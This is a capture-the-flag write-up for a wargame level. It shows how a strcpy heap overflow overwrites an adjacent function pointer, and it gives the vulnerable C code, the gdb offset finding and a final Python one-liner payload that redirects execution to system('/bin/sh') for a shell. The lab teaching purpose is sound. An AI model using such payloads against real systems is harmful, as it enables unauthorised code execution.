# Level 6 — Heap Overflow (Function Pointer Hijack)

## Idea (Simple)

* Program stores a **function pointer** on the heap
* It copies your input using `strcpy` (no limit)
* You can overflow and **replace that function pointer**
* Instead of calling a safe function → call `system()`

---

## What the Program Does

Step by step:

```c
ptr1 = malloc(64);   // buffer
ptr2 = malloc(4);    // function pointer

*ptr2 = m;           // default function

strcpy(ptr1, argv[1]);  // <-- vulnerable

call *ptr2;          // execute function
```

---

## Functions

### Safe function

```asm
m → puts()
```

### Target function

```asm
n → system("/bin/sh")
```

---

## Vulnerability

```c
strcpy(ptr1, argv[1]);
```

* Buffer size = 64 bytes
* No limit → overflow possible
* `ptr2` is stored **right after ptr1 in memory**

So:

```
[ ptr1 (64 bytes) ][ ptr2 (function pointer) ]
```

Overflowing `ptr1` → overwrites `ptr2`

---

## Finding Offset

Using pattern:

```bash
(gdb) run AAA...
EIP = 0x41346341
```

Result:

```
offset = 72 bytes
```

---

## Exploit Goal

Replace:

```
ptr2 = m
```

With:

```
ptr2 = n
```

---

## Address of n

```
0x08048454
```

---

## Final Payload

```bash
./level6 $(python -c "print 72 * 'A' + '\x08\x04\x84\x54'[::-1]")
```

---

## Why It Works

* First 72 bytes → reach function pointer
* Last 4 bytes → overwrite it with address of `n`
* Program calls pointer → now calls `system()`

---

## Result

```
system("/bin/sh")
```

You get a shell and move to next level.

---

## Key Takeaway

* Heap overflow can overwrite **function pointers**
* `strcpy` is dangerous without bounds checking
* Control pointer → control execution

---
